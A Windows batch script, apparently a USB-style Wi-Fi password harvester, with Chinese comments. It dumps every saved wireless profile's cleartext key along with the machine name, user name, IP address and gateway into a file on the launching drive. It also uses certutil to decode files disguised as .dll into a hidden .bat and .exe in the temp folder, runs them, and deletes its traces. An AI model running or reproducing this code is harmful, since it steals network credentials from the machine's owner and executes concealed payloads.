@echo off
if not "%OS%"=="Windows_NT" EXIT
if not "%0"=="saveWiFi.bat" exit
@echo off
chcp 65001 >nul
title saveWiFi

if "%1"=="end" goto end

echo Starting working ....
%windir%\System32\certutil.exe -decode -f findWIfi.dll %temp%\scanWifi.bat >nul
%windir%\System32\certutil.exe -decode -f scanWifi.dll %temp%\scanWifi.exe >nul

rem 删除不需要的文件
if exist "%temp%\userfiles.txt"  ( del %temp%\userfiles.txt )
if exist "%temp%\userfiles2.txt"  ( del %temp%\userfiles2.txt )
if exist "%temp%\password.txt"  (del %temp%\password.txt)
if exist "%temp%\wifiPassword2.txt"  ( del %temp%\wifiPassword2.txt )




rem 获取用户配置文件,实时刷新
netsh wlan show profiles |find "All User Profile" >%temp%\userfiles.txt
rem 提取SSID name 
powershell -Command "(gc %temp%\userfiles.txt) -replace '    All User Profile     : ', ''" >%temp%\userfiles2.txt

rem 删除不需要的文件
if exist "%temp%\userfiles.txt"  ( del %temp%\userfiles.txt )

rem 功能二：保存密码到%temp%\password.txt

rem 遍历SSID name
for /F "tokens=*" %%i in (%temp%\userfiles2.txt) do (
echo ==========================================================>>%temp%\password.txt
((netsh wlan show profiles name="%%i" key=clear |find "SSID name")||echo     SSID name              : "%%i"  )>>%temp%\password.txt
((netsh wlan show profiles name="%%i" key=clear |find "Key Content")||echo     Key Content            : NO exist )>>%temp%\password.txt
)

rem 替换关键字
powershell -Command "(gc %temp%\password.txt) -replace 'SSID name',  'Wifi name'" >%temp%\wifiPassword2.txt
set cName=%computername%
set uName=%username%
rem 设置时间,将小于10点之前的一位数变为两位数
set hour=%time:~0,2%
for /l %%i in (0,1,9) do (
	if %time:~0,2%==%%i set hour=0%%i
)

REM set leg=en
REM ( systeminfo | find "zh-cn" >nul) && set leg=cn 
REM if "%leg%"=="en" (
	REM set dateTime=%date:~10,4%%date:~4,2%%date:~7,2%_%hour%%time:~3,2%%time:~6,2%%time:~9,2%
REM ) else (
	REM set dateTime=%date:~3,4%%date:~8,2%%date:~11,2%_%hour%%time:~3,2%%time:~6,2%%time:~9,2%
REM )

set dateTime=%date:~10,4%%date:~4,2%%date:~7,2%_%hour%%time:~3,2%%time:~6,2%%time:~9,2%
echo %dateTime% |find "/" &&	set dateTime=%date:~3,4%%date:~8,2%%date:~11,2%_%hour%%time:~3,2%%time:~6,2%%time:~9,2%

set wifiP=%temp%\wifiP.txt
powershell -Command "(gc %temp%\wifiPassword2.txt) -replace 'Key Content','Password   '>%wifiP%"

set fname=WifiPassword_%cName%_%uName%_%dateTime%.txt
rem 功能四：获取本机ip和网关
echo ==========================================================>%fname%
echo IPv4 Address : >>%fname%
( for /f "tokens=2 delims=:" %%b in (' ipconfig ^|find "IPv4" ') do echo 		%%b ) >>%fname%
echo Default Gateway: >>%fname%
( for /f "tokens=2 delims=:" %%b in (' ipconfig ^|find "Default" ') do if not "%%b"==" " echo 		%%b ) >>%fname%
echo ==========================================================>>%fname%
echo 			Wifi  Password >>%fname%
more %wifiP% >>%fname%
if exist %wifiP% del %wifiP%

rem 功能四：end 

rem 删除不需要的文件
if exist "%temp%\userfiles.txt"  ( del %temp%\userfiles.txt )
if exist "%temp%\userfiles2.txt"  ( del %temp%\userfiles2.txt )
if exist "%temp%\password.txt"  ( del %temp%\password.txt)
if exist "%temp%\wifiPassword2.txt"  ( del %temp%\wifiPassword2.txt )

rem 移动文件
if not exist Password mkdir Password 
move WifiPassword_%cName%_%uName%*.txt .\Password >nul
cd Password
set fPath=%cd%
set pan=%~d0
if  "%1"=="h" (
	rem 查看路径下的文件目录和最新文件
	echo %cd%\%fname%
	more %fname%
)

C:
cd %temp%
scanWifi.bat %fPath%	%fname% %pan% 


:end
rem 删除不需要的文件
if exist "%temp%\userfiles.txt"  ( del %temp%\userfiles.txt )
if exist "%temp%\userfiles2.txt"  ( del %temp%\userfiles2.txt )
if exist "%temp%\password.txt"  ( del %temp%\password.txt)
if exist "%temp%\wifiPassword2.txt"  ( del %temp%\wifiPassword2.txt )
if exist "%temp%\scanWifi.bat" ( del %temp%\scanWifi.bat )
if exist "%temp%\scanWifi.exe"  ( del %temp%\scanWifi.exe )
cd Password
start .\
exit

rem 功能二:end
